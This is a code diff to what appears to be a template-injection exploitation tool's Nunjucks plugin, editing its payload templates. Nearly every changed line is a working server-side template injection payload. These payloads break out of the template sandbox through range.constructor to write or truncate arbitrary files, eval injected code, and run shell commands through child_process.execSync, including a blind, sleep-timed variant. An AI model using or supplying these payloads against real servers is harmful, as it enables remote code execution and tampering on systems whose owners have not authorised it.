@@ -14,7 +14,7 @@ class Nunjucks(javascript.Javascript):
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{range.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64url'), 'binary')")()}}}}""",
+                'write': """{{{{range.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')")()}}}}""",
                 'truncate': """{{{{range.constructor("global.process.mainModule.require('fs').writeFileSync('{path}', '')")()}}}}"""
             },
             'read': {
@@ -27,16 +27,17 @@ class Nunjucks(javascript.Javascript):
             },
             'evaluate': {
                 'call': 'render',
-                'evaluate': """{{range.constructor("return eval(Buffer('{code_b64}','base64url').toString())")()}}""",
-                'test_os': """global.process.mainModule.require('os').platform()"""
+                'evaluate': """{{{{range.constructor("return eval(Buffer('{code_b64p}','base64').toString())")()}}}}""",
+                'test_os': """global.process.mainModule.require('os').platform()""",
+                'test_os_expected': r'^[\w-]+$',
             },
             'execute': {
                 'call': 'evaluate',
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString())"""
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}')")()}}}}"""
+                'execute_blind': """{{{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')")()}}}}"""
             },
         })
 
